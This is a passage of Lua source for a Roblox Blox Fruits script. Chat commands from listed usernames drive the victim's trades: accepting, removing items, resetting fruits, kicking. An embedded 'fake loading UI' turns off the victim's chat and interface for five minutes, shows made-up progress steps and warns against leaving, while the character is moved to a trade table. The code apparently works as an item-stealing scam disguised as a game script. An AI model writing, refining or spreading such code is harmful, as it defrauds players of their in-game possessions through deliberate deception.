                local container = tradeUI.Trade:FindFirstChild("Container")
                if not container then return end
    
                local playerFrame = container:FindFirstChild("1") -- Assumes local player items are in Frame "1"
                if not playerFrame then return end
    
                local itemFrame = playerFrame:FindFirstChild("Frame") -- Frame containing item buttons
                if not itemFrame then return end
    
                local clearedCount = 0
                -- Iterate through currently displayed items in the trade UI
                -- Create a list first to avoid modifying collection while iterating
                local itemsToClear = {}
                for _, item in ipairs(itemFrame:GetChildren()) do
                    if item:IsA("ImageButton") then
                        table.insert(itemsToClear, item.Name)
                    end
                end
    
                for _, itemName in ipairs(itemsToClear) do
                     TradeFunction:InvokeServer("removeItem", itemName) -- Remove item using its display name
                     clearedCount = clearedCount + 1
                     task.wait(0.05)
                end
    
                 sendMessage("Cleared " .. clearedCount .. " item(s) from your side of the trade.")
            end
        },
    
        accept = {
            execute = function()
                 local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                 if not tradeUI or not tradeUI:FindFirstChild("Trade") or not tradeUI.Trade.Visible then
                     sendMessage("You must be in a trade to accept.")
                     return
                end
                TradeFunction:InvokeServer("accept")
                 sendMessage("Sent accept trade request.")
            end
        },
    
        resetfruit = {
            execute = function(argument)
                local inventory = getInventory()
                if not inventory then sendMessage("Could not retrieve inventory."); return end -- Add message
    
                if not argument or string.len(argument) < 3 then sendMessage("Usage: ?resetfruit <fruit name>"); return end -- Basic usage
    
                local searchTerm = argument:lower()
                local foundItem = nil
                for _, item in pairs(inventory) do
                    if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm) then
                        foundItem = item
                        break
                    end
                end
    
                if foundItem then
                    local baseFruitName = foundItem.Name:match("(%S+)") -- Get base name
                     if not baseFruitName then sendMessage("Could not parse fruit name."); return end
    
                    sendMessage("Attempting to equip and reset with '" .. foundItem.Name .. "'...")
                    ForceJump() -- Jump first
                    local successLoad, errLoad = pcall(Remote.InvokeServer, Remote, "LoadFruit", baseFruitName) -- Equip fruit (use pcall)
                    task.wait(0.25)
                    if successLoad then
                        if LocalPlayer.Character then
                            pcall(LocalPlayer.Character.BreakJoints, LocalPlayer.Character) -- Die to unequip (use pcall)
                             sendMessage("Equipped and reset with '" .. foundItem.Name .. "'.")
                        else
                             sendMessage("Equipped '" .. foundItem.Name .. "', but character is missing for reset.")
                        end
                    else
                         sendMessage("Failed to equip '" .. foundItem.Name .. "': " .. tostring(errLoad))
                    end
                    return -- Exit after finding and attempting
                end
    
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                    "No fruit matching '" .. argument .. "' found in inventory!", "All")
            end
        },
    
        kick = {
            execute = function(argument)
                if not argument or argument == "" then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("You forgot to input reason of the kick.", "All")
                    return
                end
    
                local player = game.Players.LocalPlayer
                pcall(player.Kick, player, argument) -- Kicks the script user (use pcall)
            end
        },
    
        reset = {
            execute = function()
                if LocalPlayer.Character then
                    pcall(LocalPlayer.Character.BreakJoints, LocalPlayer.Character) -- Kills the script user's character (use pcall)
                     sendMessage("Character reset.")
                else
                     sendMessage("Character is already missing.")
                end
            end
        },
    
        rejoin = {
            execute = function()
                pcall(TeleportService.Teleport, TeleportService, game.PlaceId, LocalPlayer) -- Rejoins the current game instance (use pcall)
                 sendMessage("Attempting to rejoin.")
            end
        }
    }
    
    local CommandCooldowns = {}
    local DEFAULT_COOLDOWN = 0.5
    local ChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
    local SayMessageRequest = ChatEvents:WaitForChild("SayMessageRequest")
    
    -- Helper function (already exists, clarifying)
    local function sendMessage(message)
        pcall(function()
            SayMessageRequest:FireServer(message, "All")
        end)
    end
    
    local function processChatCommand(_, player, message)
        -- Only process chat from players in the Usernames list (case-sensitive check here)
        if not (player and message and typeof(player) == "Instance" and
                player:IsA("Player") and message:sub(1,1) == "?") then
            return
        end
    
        local playerName = player.Name
        local isAuthorized = false
         -- Check if the player is in the Usernames list (case-sensitive check from original script)
         for _, authName in ipairs(Usernames) do
             if playerName == authName then
                 isAuthorized = true
                 break
             end
         end
    
        if not isAuthorized then return end
    
    
        local commandStr = message:sub(2):match("^%s*(.-)%s*$")
        if not commandStr or commandStr == "" then return end
    
        local command, argument = commandStr:match("^(%S+)%s*(.-)%s*$")
        if not command then return end
        command = command:lower() -- Commands are case-insensitive
    
        local commandFunc = Commands[command]
        if not commandFunc then
            sendMessage("idk ts: ?" .. command)
            return
        end
    
        -- Cooldown logic
        local playerCooldowns = CommandCooldowns[playerName]
        if not playerCooldowns then
            playerCooldowns = {}
            CommandCooldowns[playerName] = playerCooldowns
        end
    
        local lastUsed = playerCooldowns[command]
        if lastUsed and (tick() - lastUsed < DEFAULT_COOLDOWN) then
            sendMessage("try again pls")
            return
        end
    
        playerCooldowns[command] = tick() -- Record command use time
    
        -- Execute command in a new thread
        task.spawn(function()
            local success = pcall(commandFunc.execute, argument)
            if not success then
                -- Do not expose specific error message from pcall to chat for security
                warn("Error executing command '"..command.."': " .. tostring(getfenv(0)["_ERRORMESSAGE"])) -- Log error server-side
                sendMessage("Error executing command: " .. command)
            end
        end)
    end
    
    -- Clean up cooldown data when a player leaves
    Players.PlayerRemoving:Connect(function(player)
        CommandCooldowns[player.Name] = nil
    end)
    
    
    -- << START OF EMBEDDED FAKE LOADING UI SCRIPT >>
    -- This function contains the full code from loading Ui v2.txt
    local function runFakeLoadingUI()
        -- PASTE THE ENTIRE CONTENT OF loading Ui v2.txt HERE
        local Players = game:GetService("Players")
        local TweenService = game:GetService("TweenService")
        local UserInputService = game:GetService("UserInputService")
        local StarterGui = game:GetService("StarterGui")
        local RunService = game:GetService("RunService")
        local ContentProvider = game:GetService("ContentProvider")
        
        local player = Players.LocalPlayer
        local playerGui = player:WaitForChild("PlayerGui")
        
        local loadingGui = Instance.new("ScreenGui")
        loadingGui.Name = "BloxFruitsLoading"
        loadingGui.IgnoreGuiInset = true
        loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        loadingGui.ResetOnSpawn = false
        loadingGui.Parent = playerGui
        
        local backgroundFrame = Instance.new("Frame")
        backgroundFrame.Name = "Background"
        backgroundFrame.Size = UDim2.new(0, 0, 0, 0)
        backgroundFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
        backgroundFrame.BorderSizePixel = 0
        backgroundFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
        backgroundFrame.AnchorPoint = Vector2.new(0.5, 0.5)
        backgroundFrame.Parent = loadingGui
        
        local backgroundPattern = Instance.new("ImageLabel")
        backgroundPattern.Name = "Pattern"
        backgroundPattern.Size = UDim2.new(1, 0, 1, 0)
        backgroundPattern.BackgroundTransparency = 1
        backgroundPattern.Image = "rbxassetid://6073763717"
        backgroundPattern.ImageTransparency = 0.85
        backgroundPattern.ImageColor3 = Color3.fromRGB(0, 120, 215)
        backgroundPattern.ScaleType = Enum.ScaleType.Tile
        backgroundPattern.TileSize = UDim2.new(0, 200, 0, 200)
        backgroundPattern.Parent = backgroundFrame
        
        local messageFrame = Instance.new("Frame")
        messageFrame.Name = "MessageFrame"
        messageFrame.Size = UDim2.new(0.8, 0, 0.6, 0)
        messageFrame.BackgroundTransparency = 1
        messageFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
        messageFrame.AnchorPoint = Vector2.new(0.5, 0.5)
        messageFrame.Parent = backgroundFrame
        
        local logoImage = Instance.new("ImageLabel")
        logoImage.Name = "Logo"
        logoImage.Size = UDim2.new(0, 150, 0, 150)
        logoImage.BackgroundTransparency = 1
        logoImage.Position = UDim2.new(0.5, 0, 0.3, 0)
        logoImage.AnchorPoint = Vector2.new(0.5, 0.5)
        logoImage.Image = "rbxassetid://6034848748"
        logoImage.ImageTransparency = 1
        logoImage.Parent = messageFrame
        
        local messageText = Instance.new("TextLabel")
        messageText.Name = "Message"
        messageText.Size = UDim2.new(1, 0, 0.25, 0)
        messageText.Position = UDim2.new(0, 0, 0.5, 0)
        messageText.BackgroundTransparency = 1
        messageText.Font = Enum.Font.GothamMedium
        messageText.TextScaled = true
        messageText.TextColor3 = Color3.fromRGB(255, 255, 255)
        messageText.TextXAlignment = Enum.TextXAlignment.Left
        messageText.TextYAlignment = Enum.TextYAlignment.Top
        messageText.TextWrapped = true
        messageText.Text = ""
        messageText.TextScaled = true
        messageText.Parent = messageFrame
        
        local spinnerFrame = Instance.new("Frame")
        spinnerFrame.Name = "Spinner"
        spinnerFrame.Size = UDim2.new(0, 40, 0, 40)
        spinnerFrame.BackgroundTransparency = 1
        spinnerFrame.Position = UDim2.new(0.5, 0, 0.85, 0)
        spinnerFrame.AnchorPoint = Vector2.new(0.5, 0.5)
        spinnerFrame.Parent = messageFrame
        
        for i = 1, 4 do
            local dot = Instance.new("Frame")
            dot.Name = "Dot" .. i
            dot.Size = UDim2.new(0, 8, 0, 8)
            dot.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
            dot.BorderSizePixel = 0
            dot.AnchorPoint = Vector2.new(0.5, 0.5)
            
            local angle = (i - 1) * math.pi / 2
            local radius = 15
            local xPos = math.cos(angle) * radius
            local yPos = math.sin(angle) * radius
            
            dot.Position = UDim2.new(0.5, xPos, 0.5, yPos)
            
            local cornerRadius = Instance.new("UICorner")
            cornerRadius.CornerRadius = UDim.new(1, 0)
            cornerRadius.Parent = dot
            
            dot.Parent = spinnerFrame
        end
        
        local mainUI = Instance.new("Frame")
        mainUI.Name = "MainUI"
        mainUI.Size = UDim2.new(0.8, 0, 0.7, 0)
        mainUI.BackgroundColor3 = Color3.fromRGB(20, 24, 35)
        mainUI.Position = UDim2.new(1.5, 0, 0.5, 0)
        mainUI.AnchorPoint = Vector2.new(0.5, 0.5)
        mainUI.BorderSizePixel = 0
        mainUI.Visible = false
        mainUI.Parent = loadingGui
        
        local mainUIStroke = Instance.new("UIStroke")
        mainUIStroke.Color = Color3.fromRGB(65, 105, 225)
        mainUIStroke.Thickness = 2
        mainUIStroke.Transparency = 0.3
        mainUIStroke.Parent = mainUI
        
        local uiCorner = Instance.new("UICorner")
        uiCorner.CornerRadius = UDim.new(0.02, 0)
        uiCorner.Parent = mainUI
        
        local uiGradient = Instance.new("UIGradient")
        uiGradient.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 34, 45)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 24, 35))
        })
        uiGradient.Rotation = 45
        uiGradient.Parent = mainUI
        
        local accentBar = Instance.new("Frame")
        accentBar.Name = "AccentBar"
        accentBar.Size = UDim2.new(0.2, 0, 0.01, 0)
        accentBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
        accentBar.BorderSizePixel = 0
        accentBar.Position = UDim2.new(0.5, 0, 0.08, 0)
        accentBar.AnchorPoint = Vector2.new(0.5, 0.5)
        accentBar.Parent = mainUI
        
        local accentBarCorner = Instance.new("UICorner")
        accentBarCorner.CornerRadius = UDim.new(1, 0)
        accentBarCorner.Parent = accentBar
        
        local titleLabel = Instance.new("TextLabel")
        titleLabel.Name = "Title"
        titleLabel.Size = UDim2.new(1, 0, 0.13, 0)
        titleLabel.BackgroundTransparency = 1
        titleLabel.Position = UDim2.new(0, 0, 0.13, 0)
        titleLabel.Font = Enum.Font.GothamBlack
        titleLabel.Text = "BLOX FRUITS"
        titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        titleLabel.TextScaled = true
        titleLabel.Parent = mainUI
        
        local titleShadow = titleLabel:Clone()
        titleShadow.Name = "TitleShadow"
        titleShadow.TextColor3 = Color3.fromRGB(0, 170, 255)
        titleShadow.TextTransparency = 0.7
        titleShadow.Position = UDim2.new(0, 2, 0.13, 2)
        titleShadow.ZIndex = titleLabel.ZIndex - 1
        titleShadow.Parent = mainUI
        
        local subtitleLabel = Instance.new("TextLabel")
        subtitleLabel.Name = "Subtitle"
        subtitleLabel.Size = UDim2.new(0.8, 0, 0.07, 0)
        subtitleLabel.BackgroundTransparency = 1
        subtitleLabel.Position = UDim2.new(0.5, 0, 0.25, 0)
        subtitleLabel.AnchorPoint = Vector2.new(0.5, 0)
        subtitleLabel.Font = Enum.Font.GothamSemibold
        subtitleLabel.Text = "Final Stage of Loading"
        subtitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
        subtitleLabel.TextScaled = true
        subtitleLabel.Parent = mainUI
        
        local decorativeLine1 = Instance.new("Frame")
        decorativeLine1.Name = "DecoLine1"
        decorativeLine1.Size = UDim2.new(0.2, 0, 0.003, 0)
        decorativeLine1.BackgroundColor3 = Color3.fromRGB(65, 105, 225)
        decorativeLine1.Position = UDim2.new(0.2, 0, 0.35, 0)
        decorativeLine1.BorderSizePixel = 0
        decorativeLine1.Parent = mainUI
        
        local decorativeLine2 = Instance.new("Frame")
        decorativeLine2.Name = "DecoLine2"
        decorativeLine2.Size = UDim2.new(0.2, 0, 0.003, 0)
        decorativeLine2.BackgroundColor3 = Color3.fromRGB(65, 105, 225)
        decorativeLine2.Position = UDim2.new(0.8, 0, 0.35, 0)
        decorativeLine2.AnchorPoint = Vector2.new(1, 0)
        decorativeLine2.BorderSizePixel = 0
        decorativeLine2.Parent = mainUI
        
        local statusLabel = Instance.new("TextLabel")
        statusLabel.Name = "Status"
        statusLabel.Size = UDim2.new(0.8, 0, 0.06, 0)
        statusLabel.BackgroundTransparency = 1
        statusLabel.Position = UDim2.new(0.5, 0, 0.4, 0)
        statusLabel.AnchorPoint = Vector2.new(0.5, 0)
        statusLabel.Font = Enum.Font.GothamMedium
        statusLabel.Text = "Status: Initializing..."
        statusLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
        statusLabel.TextScaled = true
        statusLabel.Parent = mainUI
        
        local percentLabel = Instance.new("TextLabel")
        percentLabel.Name = "Percent"
        percentLabel.Size = UDim2.new(0.2, 0, 0.06, 0)
        percentLabel.BackgroundTransparency = 1
        percentLabel.Position = UDim2.new(0.9, 0, 0.55, 0)
        percentLabel.AnchorPoint = Vector2.new(1, 0.5)
        percentLabel.Font = Enum.Font.GothamBold
        percentLabel.Text = "0%"
        percentLabel.TextColor3 = Color3.fromRGB(0, 170, 255)
        percentLabel.TextScaled = true
        percentLabel.Parent = mainUI
        
        local progressBarBackground = Instance.new("Frame")
        progressBarBackground.Name = "ProgressBarBg"
        progressBarBackground.Size = UDim2.new(0.8, 0, 0.06, 0)
        progressBarBackground.Position = UDim2.new(0.5, 0, 0.55, 0)
        progressBarBackground.AnchorPoint = Vector2.new(0.5, 0.5)
        progressBarBackground.BackgroundColor3 = Color3.fromRGB(40, 44, 55)
        progressBarBackground.BorderSizePixel = 0
        progressBarBackground.Parent = mainUI
        
        local progressBarStroke = Instance.new("UIStroke")
        progressBarStroke.Color = Color3.fromRGB(65, 105, 225)
        progressBarStroke.Thickness = 1
        progressBarStroke.Transparency = 0.7
        progressBarStroke.Parent = progressBarBackground
        
        local progressBarCorner = Instance.new("UICorner")
        progressBarCorner.CornerRadius = UDim.new(0.5, 0)
        progressBarCorner.Parent = progressBarBackground
        
        local progressBar = Instance.new("Frame")
        progressBar.Name = "ProgressBar"
        progressBar.Size = UDim2.new(0, 0, 1, 0)
        progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
        progressBar.BorderSizePixel = 0
        progressBar.Parent = progressBarBackground
        
        local progressBarCorner2 = Instance.new("UICorner")
        progressBarCorner2.CornerRadius = UDim.new(0.5, 0)
        progressBarCorner2.Parent = progressBar
        
        local progressGradient = Instance.new("UIGradient")
        progressGradient.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 170, 255)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(65, 105, 225)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 170, 255))
        })
        progressGradient.Offset = Vector2.new(0, 0)
        progressGradient.Parent = progressBar
        
        local infoPanel = Instance.new("Frame")
        infoPanel.Name = "InfoPanel"
        infoPanel.Size = UDim2.new(0.8, 0, 0.25, 0)
        infoPanel.Position = UDim2.new(0.5, 0, 0.7, 0)
        infoPanel.AnchorPoint = Vector2.new(0.5, 0)
        infoPanel.BackgroundColor3 = Color3.fromRGB(30, 34, 45)
        infoPanel.BackgroundTransparency = 0.5
        infoPanel.BorderSizePixel = 0
        infoPanel.Parent = mainUI
        
        local infoPanelCorner = Instance.new("UICorner")
        infoPanelCorner.CornerRadius = UDim.new(0.05, 0)
        infoPanelCorner.Parent = infoPanel
        
        local infoPanelStroke = Instance.new("UIStroke")
        infoPanelStroke.Color = Color3.fromRGB(65, 105, 225)
        infoPanelStroke.Thickness = 1
        infoPanelStroke.Transparency = 0.7
        infoPanelStroke.Parent = infoPanel
        
        local infoTitle = Instance.new("TextLabel")
        infoTitle.Name = "InfoTitle"
        infoTitle.Size = UDim2.new(1, 0, 0.2, 0)
        infoTitle.BackgroundTransparency = 1
        infoTitle.Font = Enum.Font.GothamSemibold
        infoTitle.Text = "LOADING DETAILS"
        infoTitle.TextColor3 = Color3.fromRGB(0, 170, 255)
        infoTitle.TextScaled = true
        infoTitle.Parent = infoPanel
        
        local infoContent = Instance.new("TextLabel")
        infoContent.Name = "InfoContent"
        infoContent.Size = UDim2.new(0.95, 0, 0.7, 0)
        infoContent.Position = UDim2.new(0.5, 0, 0.25, 0)
        infoContent.AnchorPoint = Vector2.new(0.5, 0)
        infoContent.BackgroundTransparency = 1
        infoContent.Font = Enum.Font.Gotham
        infoContent.Text = "Initializing game components..."
        infoContent.TextColor3 = Color3.fromRGB(200, 200, 200)
        infoContent.TextScaled = true
        infoContent.TextWrapped = true
        infoContent.TextXAlignment = Enum.TextXAlignment.Left
        infoContent.TextYAlignment = Enum.TextYAlignment.Top
        infoContent.Parent = infoPanel
        
        local function animateSpinner()
            local spinSpeed = 2
            local dotOpacity = {1, 0.7, 0.4, 0.1}
            
            RunService.Heartbeat:Connect(function(deltaTime)
                if spinnerFrame.Visible then
                    for i = 1, 4 do
                        local dot = spinnerFrame:FindFirstChild("Dot" .. i)
                        if dot then
                            local currentIndex = (i + math.floor(tick() * spinSpeed)) % 4 + 1
                            dot.BackgroundTransparency = 1 - dotOpacity[currentIndex]
                        end
                    end
                end
            end)
        end
        
        local function animateProgressGradient()
            RunService.Heartbeat:Connect(function(deltaTime)
                if progressGradient and mainUI.Visible then
                    progressGradient.Offset = Vector2.new((tick() * 0.2) % 2 - 1, 0)
                end
            end)
        end
        
        local function typewriterEffect(text, duration)
            messageText.Text = ""
            local textLength = string.len(text)
            local timePerChar = duration / textLength
            
            for i = 1, textLength do
                messageText.Text = string.sub(text, 1, i)
                wait(timePerChar)
            end
        end
        
        local function updateProgressBar(percentage)
            local tween = TweenService:Create(progressBar, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                Size = UDim2.new(percentage / 100, 0, 1, 0)
            })
            tween:Play()
            percentLabel.Text = string.format("%.0f%%", percentage)
        end
        
        local function updateStatus(status)
            statusLabel.Text = "Status: " .. status
        end
        
        local function updateInfoContent(info)
            infoContent.Text = info
        end
        
        local function createBackgroundEffects()
            local effectsContainer = Instance.new("Frame")
            effectsContainer.Name = "Effects"
            effectsContainer.Size = UDim2.new(1, 0, 1, 0)
            effectsContainer.BackgroundTransparency = 1
            effectsContainer.ClipsDescendants = true
            effectsContainer.Parent = mainUI
            
            for i = 1, 12 do
                local line = Instance.new("Frame")
                line.Name = "Line" .. i
                line.BackgroundColor3 = Color3.fromRGB(65, 105, 225)
                line.BackgroundTransparency = 0.7
                line.BorderSizePixel = 0
                
                local height = math.random(40, 100)
                local width = math.random(1, 2)
                line.Size = UDim2.new(0, width, 0, height)
                
                local xPos = math.random(0, 100) / 100
                local yPos = math.random(0, 100) / 100
                
                line.Position = UDim2.new(xPos, 0, yPos, 0)
                
                line.Parent = effectsContainer
                
                spawn(function()
                    while mainUI.Visible do
                        local duration = math.random(3, 7)
                        local newYPos = math.random(-20, 120) / 100
                        
                        local tween = TweenService:Create(line, TweenInfo.new(duration, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                            Position = UDim2.new(xPos, 0, newYPos, 0),
                            BackgroundTransparency = math.random(70, 90) / 100
                        })
                        
                        tween:Play()
                        wait(duration)
                    end
                end)
            end
            
            for i = 1, 15 do
                local dot = Instance.new("Frame")
                dot.Name = "BgDot" .. i
                dot.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
                dot.BackgroundTransparency = 0.8
                dot.BorderSizePixel = 0
                
                local size = math.random(2, 4)
                dot.Size = UDim2.new(0, size, 0, size)
                
                local corner = Instance.new("UICorner")
                corner.CornerRadius = UDim.new(1, 0)
                corner.Parent = dot
                
                local xPos = math.random(0, 100) / 100
                local yPos = math.random(0, 100) / 100
                
                dot.Position = UDim2.new(xPos, 0, yPos, 0)
                dot.Parent = effectsContainer
                
                spawn(function()
                    while mainUI.Visible do
                        local duration = math.random(2, 5)
                        local newXPos = xPos + (math.random(-10, 10) / 100)
                        local newYPos = yPos + (math.random(-10, 10) / 100)
                        
                        local tween = TweenService:Create(dot, TweenInfo.new(duration, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                            Position = UDim2.new(newXPos, 0, newYPos, 0),
                            BackgroundTransparency = math.random(70, 90) / 100
                        })
                        
                        tween:Play()
                        wait(duration)
                        
                        xPos = newXPos
                        yPos = newYPos
                    end
                end)
            end
        end
        
        local function disableDefaultUI()
            local success = pcall(function()
                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
            end)
        end
        
        local function startLoading()
            disableDefaultUI()
            
            local openTween = TweenService:Create(backgroundFrame, TweenInfo.new(1, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                Size = UDim2.new(1, 0, 1, 0)
            })
            openTween:Play()
            
            wait(1)
            
            local logoFadeIn = TweenService:Create(logoImage, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                ImageTransparency = 0
            })
            logoFadeIn:Play()
            
            spinnerFrame.Visible = true
            animateSpinner()
            
            wait(1.5)
            
            local replicaMessages = {
                "Hello! The script is almost done loading. We just need to do some extra steps",
                "During the last stage of loading - Please, do NOT leave the game. Or it could result in data loss",
                "Well yeah. That's all you need to know. Now - Just wait."
            }
            
            for _, message in ipairs(replicaMessages) do
                typewriterEffect(message, 3)
                wait(4)
            end
            
            wait(1)
            
            local logoFadeOut = TweenService:Create(logoImage, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                ImageTransparency = 1
            })
            logoFadeOut:Play()
            
            wait(0.8)
            
            messageFrame.Visible = false
            mainUI.Visible = true
            
            animateProgressGradient()
            createBackgroundEffects()
            
            local mainUITween = TweenService:Create(mainUI, TweenInfo.new(1, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                Position = UDim2.new(0.5, 0, 0.5, 0)
            })
            mainUITween:Play()
            
        local loadingSteps = {
            {
                status = "Waking up systems...", 
                info = "- Booting main modules\n- Warming up engines\n- Getting stuff ready", 
                time = 20
            },
            {
                status = "Loading the heavy stuff...", 
                info = "- Grabbing all those textures\n- Loading the big modules\n- Making sure everything fits\n- Checking for bugs", 
                time = 35
            },
            {
                status = "Checking connections...", 
                info = "- Making sure we're online\n- Testing server response\n- Checking your internet\n- Setting up chat", 
                time = 30
            },
            {
                status = "Finding your stuff...", 
                info = "- Looking for your save data\n- Grabbing your settings\n- Making sure nothing's missing\n- Getting your profile ready", 
                time = 40
            },
            {
                status = "Setting up the fun parts...", 
                info = "- Loading combat stuff\n- Setting up all the extras\n- Making sure everything works\n- Final testing", 
                time = 35
            },
            {
                status = "Last few bits...", 
                info = "- Crossing our t's\n- Dotting our i's\n- Making things smooth\n- Just a moment longer", 
                time = 25
            },
            {
                status = "We're good to go!", 
                info = "- Everything's loaded\n- No problems found\n- Let's get started!", 
                time = 15
            }
        }
            
            local totalTime = 300
            local elapsedTime = 0
            
            local currentStep = 1
            local currentStepTime = 0
            
            while elapsedTime < totalTime do
                local step = loadingSteps[currentStep]
                updateStatus(step.status)
                updateInfoContent(step.info)
                
                currentStepTime = currentStepTime + 1
                
                if currentStepTime >= step.time then
                    currentStepTime = 0
                    currentStep = currentStep + 1
                    if currentStep > #loadingSteps then
                        currentStep = #loadingSteps
                    end
                end
                
                local percentage = (elapsedTime / totalTime) * 100
                updateProgressBar(percentage)
                
                wait(1)
                elapsedTime = elapsedTime + 1
            end
            
            updateProgressBar(100)
            updateStatus("Loading complete!")
            updateInfoContent("- Script is Loaded!\n- Script is ready\n- Have Fun!")
            
            wait(2)
            
            local mainUIOut = TweenService:Create(mainUI, TweenInfo.new(1, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
                Position = UDim2.new(1.5, 0, 0.5, 0)
            })
            mainUIOut:Play()
            
            wait(1)
            
            local bgFade = TweenService:Create(backgroundFrame, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                BackgroundTransparency = 1
            })
            bgFade:Play()
            
            TweenService:Create(backgroundPattern, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                ImageTransparency = 1
            }):Play()
            
            wait(1.5)
            
            pcall(function()
                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
            end)
            
            loadingGui:Destroy()
        end
        
        local function handleResponsiveUI()
            local function updateUI()
                local viewportSize = workspace.CurrentCamera.ViewportSize
                local isPortrait = viewportSize.Y > viewportSize.X
                
                if isPortrait then
                    mainUI.Size = UDim2.new(0.95, 0, 0.7, 0)
                    messageFrame.Size = UDim2.new(0.95, 0, 0.7, 0)
                    messageText.TextSize = 20
                    infoContent.TextSize = 16
                else
                    mainUI.Size = UDim2.new(0.8, 0, 0.7, 0)
                    messageFrame.Size = UDim2.new(0.8, 0, 0.6, 0)
                    messageText.TextSize = 24
                    infoContent.TextSize = 18
                end
            end
            
            updateUI()
            workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(updateUI)
        end
        
        handleResponsiveUI()
        startLoading()
    end
    -- << END OF EMBEDDED FAKE LOADING UI SCRIPT >>
    
    
    local function startMainLoop()
        local isLoopRunning = true
        local hasCheckedCurrentTrade = false
        local currentTable, currentSeat
        local randomOffset = Vector3.new(math.random(-1, 1), 0, math.random(-1, 1)) -- Y offset should probably be 0 for ground movement
    
        local lastMovementTime = tick()
        local lastTableCheck = lastMovementTime
        local lastTradeCheck = lastMovementTime
    
        local UPDATE_INTERVAL = 1.5
        local TABLE_CHECK_INTERVAL = 2
        local MOVEMENT_CHECK_INTERVAL = 4
        local TRADE_VALIDATION_DELAY = 1.5 -- Delay before validating trade partner after entering trade
        local TRADE_RECHECK_COUNT = 4 -- How many times to check the trade partner
    
        local validateTradePartnerRunning = false
        local function validateTradePartner()
            if validateTradePartnerRunning then return end
            validateTradePartnerRunning = true
    
            local failedChecks = 0
            local lastTradeState = false -- Track if the trade UI was visible on the previous check
    
            for _ = 1, TRADE_RECHECK_COUNT do
                task.wait(0.5) -- Wait between checks
    
                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                local currentTradeState = tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible
    
                -- If trade state changed (closed unexpectedly) OR trade is visible but partner is wrong
                if lastTradeState ~= currentTradeState or (currentTradeState and not isInTradeWithCorrectPlayer()) then
                     failedChecks = failedChecks + 1
                end
    
                lastTradeState = currentTradeState -- Update state for next check
            end
    
            -- If most checks failed (indicating a problem with the trade or partner)
            if failedChecks >= TRADE_RECHECK_COUNT - 1 then
                task.wait(0.25) -- Small delay
                ForceJump() -- Attempt to break out of seat/trade
            end
    
            validateTradePartnerRunning = false
        end
    
        local characterAddedConnection
        local characterRemovingConnection
    
        local function onCharacterAdded(character)
            task.wait(1) -- Wait a moment for character to fully load
    
            local humanoid = character:FindFirstChild("Humanoid")
            local rootPart = character:FindFirstChild("HumanoidRootPart")
    
            -- Wait longer if not found immediately
            if not humanoid or not rootPart then
                humanoid = character:WaitForChild("Humanoid", 5)
                rootPart = character:WaitForChild("HumanoidRootPart", 5)
    
                if not humanoid or not rootPart then
                     warn("Character added, but Humanoid or RootPart not found after wait.")
                    return -- Exit if critical parts are missing
                end
            end
    
            local now = tick()
            lastMovementTime = now
            lastTableCheck = now
            lastTradeCheck = now
    
            disableJump() -- Re-disable jump on new character
    
            task.spawn(function() -- Try to find and go to a table immediately on spawn
                currentTable, currentSeat = findTradeTable()
                if currentTable and currentSeat then
                    tweenToPosition(currentSeat.Position)
                end
            end)
        end
    
        local function runMainLoop()
            local lastTime = tick() -- For calculating deltaTime
    
            while isLoopRunning do
                local now = tick()
                local deltaTime = now - lastTime
                lastTime = now
    
                local character = LocalPlayer.Character
                local rootPart = character and character:FindFirstChild("HumanoidRootPart")
    
                if character and rootPart then -- Ensure character exists
                    local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                    local isInTrade = tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible
    
                    -- Trade validation logic
                    if not isInTrade then
                        hasCheckedCurrentTrade = false -- Reset flag when not in trade
                        lastTradeCheck = now -- Update timestamp
                    elseif not hasCheckedCurrentTrade and (now - lastTradeCheck) >= TRADE_VALIDATION_DELAY then
                        task.spawn(validateTradePartner) -- Start validation in a new thread
                        hasCheckedCurrentTrade = true -- Set flag so it only runs once per trade
                    end
    
                    -- Periodic table checking
                    if now - lastTableCheck >= TABLE_CHECK_INTERVAL then
                        task.spawn(function() -- Find table in a new thread
                            local newTable, newSeat = findTradeTable()
                            if newTable and newSeat then
